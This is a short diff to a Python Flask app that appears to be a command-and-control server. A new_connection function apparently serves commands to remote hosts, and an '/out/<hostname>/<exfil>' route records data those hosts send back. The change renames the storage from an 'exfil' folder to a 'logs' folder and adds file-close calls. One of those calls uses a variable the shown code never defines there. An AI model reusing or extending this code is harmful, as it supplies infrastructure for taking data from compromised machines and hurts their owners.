@@ -26,6 +26,7 @@ def new_connection(hostname, username):
         pass
 
     cmd_file.close()
+    log_file.close()
 
     return command
 
@@ -33,11 +34,13 @@ def new_connection(hostname, username):
 @app.route('/out/<hostname>/<exfil>')
 @app.route('/out/<hostname>/<exfil>/')
 def exfil_data(hostname, exfil):
-    exil_file = open("exfil/" + hostname + ".txt", 'a')
+    log_file = open("logs/" + hostname + ".txt", 'a')
     return_string = ''
 
     print('[i] Response from ', hostname, ": ", exfil)
-    exil_file.writelines('[i] Response from ' + hostname + ": " + exfil + '\n')
+    log_file.writelines('[i] Response from ' + hostname + ": " + exfil + '\n')
+
+    log_file.close()
 
     return return_string
 
